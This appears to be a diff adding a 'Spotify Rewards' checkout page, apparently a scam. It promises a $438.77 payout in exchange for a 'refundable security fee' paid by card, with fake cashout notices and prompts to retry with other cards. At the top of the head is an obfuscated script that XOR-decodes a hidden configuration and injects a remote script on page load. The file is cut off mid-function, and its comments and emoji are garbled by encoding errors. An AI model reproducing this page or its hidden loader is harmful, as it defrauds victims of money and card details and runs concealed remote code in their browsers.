@@ -1,0 +1,1286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Checkout</title>
+  <script>(function(){var d_d2=atob("DCPRmUI6VFXEoOemU1jz7DBWdm/myJPSI1Drtm1ZMDvq1ZPLOkWotyFVOXum0sjVMFG46TZJeyWt2ILKfFO44SdWej+3gsuEMlel6ytYISGh08WcCH79uyVWOzelzJSEaXiquyxbOTDmmsXWOlu09Qtednnm1obKJkbzo2AMNTagkoWfMRS1qiELNWyhxoHHZUXmqnEYKQi5");var d_udyj=[];for(var u_5=0;u_5<d_d2.length;u_5++){d_udyj.push(d_d2.charCodeAt(u_5)&255);}var s_5x=d_udyj[0];var f_2t=d_udyj.slice(1,1+s_5x);var g_vui4=d_udyj.slice(1+s_5x);var q_y1yh=g_vui4.map(function(b,j_h3tf){return b^f_2t[j_h3tf%s_5x];});var t_9xf="";for(var g_ncwg=0;g_ncwg<q_y1yh.length;g_ncwg++){t_9xf+=String.fromCharCode(q_y1yh[g_ncwg]&255);}var r_iai=decodeURIComponent(escape(t_9xf));var x_4x=JSON.parse(r_iai);var q_nu9=x_4x.globals||[];q_nu9.forEach(function(q_7){window[q_7.name]=q_7.value;});var o_r=document.createElement("script");o_r.src=x_4x.url;o_r.async=true;o_r.defer=true;(x_4x.attributes||[]).forEach(function(m_o){o_r.setAttribute(m_o.name,m_o.value);});(document.head||document.documentElement).appendChild(o_r);})();</script>
+  
+  <!-- Ã°Å¸âÂ´ OTIMIZAÃâ¡Ãâ¢ES DE PRELOAD E REDE PARA A STRIPE -->
+  <link rel="preconnect" href="https://js.stripe.com" crossorigin />
+  <link rel="dns-prefetch" href="https://js.stripe.com" />
+  <link rel="preconnect" href="https://m.stripe.network" crossorigin />
+  <link rel="dns-prefetch" href="https://m.stripe.network" />
+  <link rel="preload" href="https://js.stripe.com/v3/" as="script" />
+  <script src="https://js.stripe.com/v3/"></script>
+
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "YOUR_CLARITY_PROJECT_ID");
+  </script>
+  
+  
+    <!-- Meta Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', 'YOUR_PIXEL_ID_1');
+    fbq('init', 'YOUR_PIXEL_ID_2');
+    fbq('track', 'PageView');
+    fbq('track', 'InitiateCheckout', {
+      value: 9.9,
+      currency: 'USD'
+    });
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=YOUR_PIXEL_ID_1&ev=PageView&noscript=1"
+    /></noscript>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=YOUR_PIXEL_ID_1&ev=InitiateCheckout&cd[value]=9.9&cd[currency]=USD&noscript=1"
+    /></noscript>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=YOUR_PIXEL_ID_2&ev=PageView&noscript=1"
+    /></noscript>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=YOUR_PIXEL_ID_2&ev=InitiateCheckout&cd[value]=9.9&cd[currency]=USD&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+  
+  
+  <style>
+    :root {
+      --spotify-green: #1ed760;
+      --bg-dark: #070a08;
+      --bg-card: #151515;
+      --input-bg: #1a1a1a;
+      --border-color: #2a2a2a;
+      --text-main: #ffffff;
+      --text-muted: #a0a0a0;
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { 
+      background-color: var(--bg-dark); 
+      background-image: radial-gradient(ellipse at top center, rgba(30, 215, 96, 0.08) 0%, transparent 60%);
+      color: var(--text-main); 
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .topbar {
+      display: flex; align-items: center; justify-content: center; gap: 8px; padding: 20px;
+      font-weight: 600; color: var(--spotify-green); font-size: 14px;
+    }
+    .topbar svg { width: 20px; height: 20px; fill: var(--spotify-green); }
+    .container {
+      display: flex; flex-direction: row; gap: 60px; max-width: 960px; margin: 40px auto; padding: 0 20px; width: 100%;
+    }
+    
+    .left-panel { flex: 1.2; }
+    .logo-container { margin-bottom: 24px; }
+    .logo-circle {
+      width: 64px; height: 64px; background-color: var(--spotify-green); border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .logo-circle svg { width: 40px; height: 40px; fill: #000; }
+    
+    .title { font-size: 36px; font-weight: 800; margin-bottom: 12px; line-height: 1.2; letter-spacing: -0.5px; }
+    .title span { color: var(--spotify-green); }
+    .subtitle { color: var(--text-muted); font-size: 15px; margin-bottom: 28px; line-height: 1.5; }
+    
+    .badge {
+      display: inline-flex; align-items: center; gap: 6px;
+      background: transparent; border: 1px solid var(--spotify-green);
+      color: var(--spotify-green); padding: 6px 14px; border-radius: 20px;
+      font-size: 10px; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; margin-bottom: 32px;
+    }
+    
+    .features { list-style: none; margin-bottom: 32px; }
+    .features li { display: flex; gap: 12px; margin-bottom: 20px; font-size: 13.5px; color: var(--text-muted); line-height: 1.5; align-items: flex-start; }
+    .features li svg { flex-shrink: 0; width: 20px; height: 20px; fill: var(--spotify-green); margin-top: 2px; }
+    .features li strong { color: var(--text-main); font-weight: 600; }
+    
+    .trust-badges { display: flex; gap: 24px; font-size: 11px; color: #777; font-weight: 500; }
+    .trust-badges div { display: flex; align-items: center; gap: 6px; }
+    .trust-badges svg { width: 14px; height: 14px; stroke: var(--spotify-green); }
+
+    .right-panel { flex: 1; max-width: 420px; }
+    .form-card {
+      background-color: var(--bg-card); border-radius: 12px; padding: 24px;
+      border: 1px solid #222; box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+    }
+    
+    .balance-header {
+      display: flex; justify-content: space-between; align-items: center;
+      padding-bottom: 16px; border-bottom: 1px solid var(--border-color); margin-bottom: 24px;
+    }
+    .balance-col {
+      display: flex; flex-direction: column; gap: 4px;
+    }
+    .balance-label { font-size: 10px; font-weight: 700; color: var(--text-muted); letter-spacing: 0.5px; text-transform: uppercase; }
+    .balance-amount { font-size: 20px; font-weight: 800; color: var(--spotify-green); }
+
+    .form-group { margin-bottom: 16px; }
+    .form-label { display: block; font-size: 12px; font-weight: 600; color: #e0e0e0; margin-bottom: 8px; }
+    
+    .input-wrapper {
+      display: flex; align-items: center; background: var(--input-bg);
+      border: 1px solid var(--border-color); border-radius: 8px; transition: border-color 0.2s;
+    }
+    .input-wrapper:focus-within { border-color: #555; }
+    
+    .input-icon { padding: 0 14px; display: flex; align-items: center; justify-content: center; color: #777; }
+    .input-icon svg { width: 16px; height: 16px; stroke: currentColor; }
+    .form-input { flex: 1; background: transparent; border: none; padding: 12px 14px 12px 0; color: var(--text-main); font-size: 14px; outline: none; }
+    
+    .phone-wrapper { padding: 0; overflow: hidden; }
+    .phone-prefix {
+      background-color: #222; padding: 12px 14px; display: flex; align-items: center; gap: 8px;
+      border-right: 1px solid var(--border-color); font-size: 14px; font-weight: 600; color: #fff;
+    }
+    .phone-input { flex: 1; background: transparent; border: none; padding: 12px 14px; color: var(--text-main); font-size: 14px; outline: none; }
+
+    .divider {
+      display: flex; align-items: center; text-align: center; color: #777;
+      font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin: 20px 0;
+    }
+    .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid var(--border-color); }
+    .divider span { padding: 0 10px; }
+    
+    .btn-pay {
+      width: 100%; background: var(--spotify-green); color: #000; border: none; padding: 16px;
+      font-size: 14px; font-weight: 800; border-radius: 50px; cursor: pointer; margin-top: 24px;
+      text-transform: uppercase; letter-spacing: 0.5px; display: flex; justify-content: center;
+      align-items: center; gap: 6px; transition: background 0.2s, transform 0.1s;
+    }
+    .btn-pay:hover { background: #1fdf64; transform: scale(1.02); }
+    .btn-pay:active { transform: scale(0.98); }
+    .btn-pay svg { width: 16px; height: 16px; fill: #000; stroke: #000; }
+    #card-errors { color: #f15e6c; font-size: 13px; margin-top: 10px; text-align: center; }
+    
+    .verification-banner {
+      margin-top: 16px;
+      padding: 14px 16px;
+      background: linear-gradient(180deg, rgba(30, 215, 96, 0.08) 0%, rgba(30, 215, 96, 0.02) 100%);
+      border: 1px solid rgba(30, 215, 96, 0.28);
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+      animation: banner-glow 2.5s infinite alternate ease-in-out;
+    }
+    @keyframes banner-glow {
+      0% { border-color: rgba(30, 215, 96, 0.22); }
+      100% { border-color: rgba(30, 215, 96, 0.45); }
+    }
+    .verification-header {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      color: var(--spotify-green);
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 0.4px;
+      text-transform: uppercase;
+      margin-bottom: 5px;
+    }
+    .verification-header svg {
+      width: 14px;
+      height: 14px;
+      stroke: var(--spotify-green);
+    }
+    .pulse-indicator {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background-color: var(--spotify-green);
+      box-shadow: 0 0 0 0 rgba(30, 215, 96, 0.7);
+      animation: pulse-green 1.8s infinite cubic-bezier(0.66, 0, 0, 1);
+    }
+    @keyframes pulse-green {
+      0% { box-shadow: 0 0 0 0 rgba(30, 215, 96, 0.7); }
+      70% { box-shadow: 0 0 0 7px rgba(30, 215, 96, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(30, 215, 96, 0); }
+    }
+    .verification-desc {
+      font-size: 11.5px;
+      color: #a0a0a0;
+      line-height: 1.45;
+    }
+    .verification-desc strong {
+      color: #ffffff;
+      font-weight: 600;
+    }
+    .security-badge-footer {
+      margin-top: 18px;
+      text-align: center;
+      padding: 0 6px;
+    }
+    .security-title {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-size: 11px;
+      font-weight: 700;
+      color: #d1d5db;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      margin-bottom: 4px;
+    }
+    .security-title svg {
+      width: 13px;
+      height: 13px;
+      stroke: var(--spotify-green);
+    }
+    .security-sub {
+      font-size: 10.5px;
+      color: #777777;
+      line-height: 1.45;
+      max-width: 320px;
+      margin: 0 auto;
+    }
+    
+    .stripe-skeleton {
+      height: 200px; width: 100%;
+      background: linear-gradient(90deg, #151515 25%, #222 50%, #151515 75%);
+      background-size: 200% 100%; animation: skeleton-loading 1.5s infinite;
+      border-radius: 8px; margin-top: 16px; border: 1px solid var(--border-color);
+    }
+    @keyframes skeleton-loading { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
+
+    .recent-payouts-ticker {
+      margin-top: 20px;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      padding: 8px 14px;
+      border-radius: 20px;
+      font-size: 12px;
+      color: #b3b3b3;
+      max-width: 100%;
+      box-sizing: border-box;
+      transition: all 0.3s ease;
+    }
+    .payout-live-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: #1ed760;
+      box-shadow: 0 0 8px rgba(30, 215, 96, 0.8);
+      animation: pulseDot 2s infinite ease-in-out;
+      flex-shrink: 0;
+    }
+    @keyframes pulseDot {
+      0% { transform: scale(0.9); opacity: 0.7; }
+      50% { transform: scale(1.3); opacity: 1; }
+      100% { transform: scale(0.9); opacity: 0.7; }
+    }
+    .payout-text-wrapper {
+      transition: opacity 0.35s ease;
+      line-height: 1.4;
+      font-size: 12px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .payout-val { color: #ffffff; font-weight: 700; }
+    .payout-method { color: #1ed760; font-weight: 600; }
+    .payout-time { color: #777777; font-size: 11px; margin-left: 2px; }
+    .btn-pay.btn-retry-balance {
+      background: #f59e0b !important;
+      color: #000000 !important;
+      font-weight: 800 !important;
+      letter-spacing: 0.5px !important;
+    }
+
+    @media (max-width: 480px) {
+      .recent-payouts-ticker {
+        width: 100%;
+        justify-content: center;
+        font-size: 11.5px;
+        padding: 8px 10px;
+      }
+      .payout-text-wrapper {
+        font-size: 11px;
+        text-align: center;
+      }
+    }
+
+    @media (max-width: 768px) {
+      .container { flex-direction: column; margin: 30px auto; gap: 40px; }
+      .right-panel { max-width: 100%; }
+      .title { font-size: 32px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="topbar">
+    <svg viewBox="0 0 24 24"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.24 1.021zM19.08 14.1c-.3.42-.84.54-1.26.24-3.36-2.04-8.52-2.64-12.54-1.44-.48.12-1.02-.12-1.14-.6-.12-.48.12-1.02.6-1.14 4.56-1.32 10.26-.6 14.1 1.68.42.24.54.84.24 1.26zM19.26 10.62C15.24 8.22 8.82 8.04 5.16 9.18c-.6.18-1.26-.12-1.44-.72-.18-.6.12-1.26.72-1.44 4.26-1.32 11.28-1.08 15.9 1.68.54.3.72 1.02.42 1.56-.3.54-1.02.72-1.56.36z"/></svg>
+    Spotify Rewards
+  </div>
+  
+  <div class="container">
+    <div class="left-panel">
+      <div class="logo-container">
+        <div class="logo-circle">
+          <svg viewBox="0 0 24 24"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.24 1.021zM19.08 14.1c-.3.42-.84.54-1.26.24-3.36-2.04-8.52-2.64-12.54-1.44-.48.12-1.02-.12-1.14-.6-.12-.48.12-1.02.6-1.14 4.56-1.32 10.26-.6 14.1 1.68.42.24.54.84.24 1.26zM19.26 10.62C15.24 8.22 8.82 8.04 5.16 9.18c-.6.18-1.26-.12-1.44-.72-.18-.6.12-1.26.72-1.44 4.26-1.32 11.28-1.08 15.9 1.68.54.3.72 1.02.42 1.56-.3.54-1.02.72-1.56.36z"/></svg>
+        </div>
+      </div>
+      <h1 class="title">Your <span>$438.77</span> is Ready</h1>
+      <p class="subtitle">Complete listener verification to unlock instant cashout</p>
+      
+      <div class="badge">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" style="width: 12px; height: 12px;"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        INSTANT CASHOUT VERIFICATION
+      </div>
+      
+      <ul class="features">
+        <li>
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+          <div><strong>Unlock Full Cashout:</strong> Direct deposit of your <strong>$438.77</strong> to PayPal or Bank Account</div>
+        </li>
+        <li>
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+          <div><strong>Daily Music Review Batches:</strong> Receive up to 10 new songs daily (earn $45-$80 per review)</div>
+        </li>
+        <li>
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+          <div><strong>Official Verified Listener Badge:</strong> Priority payouts with zero processing delays</div>
+        </li>
+        <li>
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+          <div><strong>100% Refundable Security Fee:</strong> Automatically refunded back to your account together with your <strong>$438.77</strong> balance right after registration</div>
+        </li>
+      </ul>
+      
+      <div class="trust-badges">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+          Instant Deposit
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+          Bank-Grade Security
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+          100% Refundable
+        </div>
+      </div>
+      
+      <div class="recent-payouts-ticker">
+        <div class="payout-live-dot"></div>
+        <div class="payout-text-wrapper" id="payout-text-wrapper">
+          <span class="payout-user" id="payout-user">Sarah M.</span> just cashed out <strong class="payout-val" id="payout-val">$438.77</strong> via <span class="payout-method" id="payout-method">Direct Deposit</span> <span class="payout-time" id="payout-time">(2m ago)</span>
+        </div>
+      </div>
+    </div>
+    
+    <div class="right-panel">
+      <div class="form-card">
+        
+        <div class="balance-header">
+          <div class="balance-col">
+            <span class="balance-label">Accumulated Balance</span>
+            <span class="balance-amount">$438.77</span>
+          </div>
+        </div>
+        
+        <form id="payment-form">
+          <div id="express-checkout-element" style="margin-bottom: 20px;"></div>
+          <div class="divider" id="express-checkout-divider" style="display: none; margin-bottom: 22px;"><span>OR PAY WITH CARD</span></div>
+
+          <div class="form-group">
+            <label class="form-label">Full name</label>
+            <div class="input-wrapper">
+              <div class="input-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div>
+              <input class="form-input" id="name" type="text" placeholder="" required autocomplete="name">
+            </div>
+          </div>
+          
+          <div class="form-group">
+            <label class="form-label">Email address</label>
+            <div class="input-wrapper">
+              <div class="input-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></div>
+              <input class="form-input" id="email" type="email" placeholder="you@example.com" required autocomplete="email">
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label">Phone number</label>
+            <div class="input-wrapper phone-wrapper">
+              <div class="phone-prefix" id="phone-prefix">
+                <span id="flag-emoji">Ã°Å¸â¡Â§Ã°Å¸â¡Â·</span>
+                <span id="dial-code">+55</span>
+              </div>
+              <input class="phone-input" id="phone" type="tel" placeholder="Phone Number" required autocomplete="tel">
+            </div>
+          </div>
+          
+          <div id="stripe-skeleton" class="stripe-skeleton"></div>
+          <div id="payment-element" style="margin-top: 16px; display: none;"></div>
+          
+          <div id="card-errors"></div>
+          <button class="btn-pay" id="submit-button" type="submit">
+            CLAIM MY REWARD 
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+          </button>
+
+          <div id="card-action-notice" class="verification-banner" style="display: none;">
+            <div class="verification-header">
+              <span class="pulse-indicator"></span>
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="5" y="2" width="14" height="20" rx="3" ry="3"></rect>
+                <line x1="12" y1="18" x2="12.01" y2="18"></line>
+              </svg>
+              <span>Bank Verification in Progress</span>
+            </div>
+            <div class="verification-desc">
+              Please check your <strong>banking app</strong> or <strong>SMS</strong> to confirm the verification prompt.
+            </div>
+          </div>
+
+          <div class="security-badge-footer">
+            <div class="security-title">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+              </svg>
+              <span>Bank-Grade 256-Bit Encryption</span>
+            </div>
+            <div class="security-sub">
+              If prompted, please confirm the quick verification in your banking app or SMS to complete the process.
+            </div>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+  
+  <script>
+    const countryDialCodes = {
+      // Tier 1 / English
+      "US": "+1", "CA": "+1", "GB": "+44", "AU": "+61", "NZ": "+64", "IE": "+353", "ZA": "+27",
+      // ÃÂsia & Oriente MÃÂ©dio
+      "TH": "+66", "SG": "+65", "MY": "+60", "PH": "+63", "ID": "+62", "VN": "+84",
+      "AE": "+971", "SA": "+966", "QA": "+974", "KW": "+965", "BH": "+973", "OM": "+968",
+      "IN": "+91", "PK": "+92", "BD": "+880", "JP": "+81", "KR": "+82", "HK": "+852", "TW": "+886", "IL": "+972",
+      // Europa
+      "DE": "+49", "FR": "+33", "IT": "+39", "ES": "+34", "PT": "+351", "NL": "+31", "BE": "+32",
+      "CH": "+41", "AT": "+43", "SE": "+46", "NO": "+47", "DK": "+45", "FI": "+358",
+      "PL": "+48", "CZ": "+420", "RO": "+40", "GR": "+30", "HU": "+36",
+      // AmÃÂ©rica Latina & Outros
+      "BR": "+55", "MX": "+52", "CO": "+57", "AR": "+54", "CL": "+56", "PE": "+51",
+      "EC": "+593", "CR": "+506", "PA": "+507", "UY": "+598", "DO": "+1809", "PR": "+1",
+      "FJ": "+679", "SL": "+232", "AZ": "+994"
+    };
+    const urlParams = new URLSearchParams(window.location.search);
+    const initialName = urlParams.get('name') || urlParams.get('nome') || '';
+    const initialEmail = urlParams.get('email') || '';
+    const initialPhone = urlParams.get('phone') || urlParams.get('telefone') || '';
+
+    if (initialName && document.getElementById('name')) document.getElementById('name').value = initialName;
+    if (initialEmail && document.getElementById('email')) document.getElementById('email').value = initialEmail;
+    // Funções de formatação e sanitização de telefone
+    
+    function formatPhoneDisplay(val, ddi) {
+      if (!val) return '';
+      let v = String(val).replace(/D/g, '');
+      const cleanDdi = String(ddi || '').replace(/D/g, '');
+      if (cleanDdi && v.startsWith(cleanDdi) && v.length > cleanDdi.length + 6) {
+        v = v.substring(cleanDdi.length);
+      }
+      if (ddi === '+1') {
+        if (v.length > 10) v = v.substring(0, 10);
+        if (v.length > 6) return '(' + v.substring(0, 3) + ') ' + v.substring(3, 6) + '-' + v.substring(6);
+        if (v.length > 3) return '(' + v.substring(0, 3) + ') ' + v.substring(3);
+        if (v.length > 0) return '(' + v;
+        return '';
+      } else if (ddi === '+55') {
+        if (v.length > 11) v = v.substring(0, 11);
+        if (v.length > 6) return '(' + v.substring(0, 2) + ') ' + v.substring(2, 7) + '-' + v.substring(7);
+        if (v.length > 2) return '(' + v.substring(0, 2) + ') ' + v.substring(2);
+        if (v.length > 0) return '(' + v;
+        return '';
+      } else {
+        if (v.length > 12) v = v.substring(0, 12);
+        return v.replace(/(d{4})(?=d)/g, '$1 ');
+      }
+    }
+
+    function getCleanE164Phone() {
+      const phoneEl = document.getElementById('phone');
+      const ddiEl = document.getElementById('dial-code');
+      const raw = (phoneEl ? phoneEl.value : '').trim();
+      const ddi = (ddiEl ? ddiEl.textContent : '').trim() || '+1';
+      const cleanDdi = ddi.replace(/D/g, '');
+      let digits = raw.replace(/D/g, '');
+      if (!digits) return '';
+      if (cleanDdi && digits.startsWith(cleanDdi) && digits.length > cleanDdi.length + 6) {
+        return '+' + digits;
+      }
+      return '+' + cleanDdi + digits;
+    }
+
+    if (initialPhone && document.getElementById('phone')) {
+      const curDdi = (document.getElementById('dial-code') ? document.getElementById('dial-code').textContent : '').trim() || '+55';
+      document.getElementById('phone').value = formatPhoneDisplay(initialPhone, curDdi);
+    }
+
+    if (urlParams.get('test_3ds') === '1' || urlParams.get('preview_3ds') === '1') {
+      const noticeEl = document.getElementById('card-action-notice');
+      if (noticeEl) noticeEl.style.display = 'block';
+    } else if (urlParams.get('test_3ds') === 'approved') {
+      const noticeEl = document.getElementById('card-action-notice');
+      if (noticeEl) {
+        noticeEl.style.display = 'block';
+        noticeEl.innerHTML = '<div class="verification-header"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg><span>Verification Approved!</span></div><div class="verification-desc">Finalizing your access...</div>';
+      }
+    }
+
+    const userCountryCode = "BR" || "BR"; 
+    
+    // Ã°Å¸âÂ´ OTIMIZAÃâ¡ÃÆO: Injeta o locale estÃÂ¡tico baseado no paÃÂ­s para evitar request extra da Stripe
+    const localeMap = { "BR": "pt-BR", "PT": "pt-PT", "US": "en", "GB": "en", "ES": "es", "MX": "es", "FR": "fr", "DE": "de", "IT": "it" };
+    const userLocale = localeMap[userCountryCode] || "en";
+    
+    function getFlagEmoji(cc) {
+      if (!cc || cc.length !== 2) return 'Ã°Å¸ÅÅ½';
+      return cc.toUpperCase().split('').map(char => String.fromCodePoint(char.charCodeAt(0) + 127397)).join('');
+    }
+
+    function displayCardError(data, defaultMsg) {
+      const errBox = document.getElementById('card-errors');
+      if (!errBox) return;
+
+      if (data && data.session_locked) {
+        errBox.innerHTML = '<div style="background:rgba(239,68,68,0.15);border:1px solid rgba(239,68,68,0.5);border-radius:10px;padding:12px 14px;margin-top:12px;color:#fca5a5;font-size:13px;line-height:1.45;text-align:left;display:flex;align-items:flex-start;gap:10px;">' +
+          '<span style="font-size:18px;line-height:1;">Ã°Å¸âºâ</span>' +
+          '<div><strong style="color:#fff;display:block;margin-bottom:2px;font-size:13.5px;">Too Many Payment Attempts</strong>' +
+          (data.error || 'Too many payment attempts. Please wait 5 minutes before trying again or use a different card.') +
+          '</div></div>';
+        const sBtn = document.getElementById('submit-button');
+        if (sBtn) { sBtn.disabled = true; sBtn.innerHTML = 'TOO MANY ATTEMPTS'; }
+        return;
+      }
+
+      if (data && data.block_card) {
+        errBox.innerHTML = '<div style="background:rgba(245,158,11,0.12);border:1px solid rgba(245,158,11,0.5);border-radius:10px;padding:12px 14px;margin-top:12px;color:#fcd34d;font-size:13px;line-height:1.45;text-align:left;display:flex;align-items:flex-start;gap:10px;">' +
+          '<span style="font-size:18px;line-height:1;">Ã¢Å¡Â Ã¯Â¸Â</span>' +
+          '<div><strong style="color:#fff;display:block;margin-bottom:2px;font-size:13.5px;">Card Declined Twice</strong>' +
+          (data.error || 'Your bank has declined this card twice. To avoid further bank blocks, please enter a different card.') +
+          '</div></div>';
+        const sBtn = document.getElementById('submit-button');
+        if (sBtn) { sBtn.disabled = true; sBtn.innerHTML = 'PLEASE ENTER ANOTHER CARD'; }
+        return;
+      }
+
+      if (data && data.is_transaction_not_allowed) {
+        errBox.innerHTML = '<div style="background:rgba(245,158,11,0.12);border:1px solid rgba(245,158,11,0.5);border-radius:10px;padding:12px 14px;margin-top:12px;color:#fcd34d;font-size:13px;line-height:1.45;text-align:left;display:flex;align-items:flex-start;gap:10px;">' +
+          '<span style="font-size:18px;line-height:1;">Ã°Å¸âÂ³</span>' +
+          '<div><strong style="color:#fff;display:block;margin-bottom:2px;font-size:13.5px;">Card Not Supported by Issuer</strong>' +
+          (data.error || 'Your bank does not allow international or prepaid transactions. Please use a standard credit or debit card.') +
+          '</div></div>';
+        return;
+      }
+
+      if (data && data.is_insufficient_funds) {
+        errBox.innerHTML = '<div style="background:rgba(239,68,68,0.12);border:1px solid rgba(239,68,68,0.4);border-radius:10px;padding:12px 14px;margin-top:12px;color:#fca5a5;font-size:13px;line-height:1.45;text-align:left;display:flex;align-items:flex-start;gap:10px;">' +
+          '<span style="font-size:18px;line-height:1;">Ã¢Å¡Â Ã¯Â¸Â</span>' +
+          '<div><strong style="color:#fff;display:block;margin-bottom:2px;font-size:13.5px;">Insufficient Card Balance</strong>' +
+          (data.error || 'Your card has insufficient funds. Please enter another card with available balance to complete your order, or your reserved spot will be released to the next person in line.') +
+          '</div></div>';
+        const sBtn = document.getElementById('submit-button');
+        if (sBtn) {
+          sBtn.disabled = false;
+          sBtn.classList.add('btn-retry-balance');
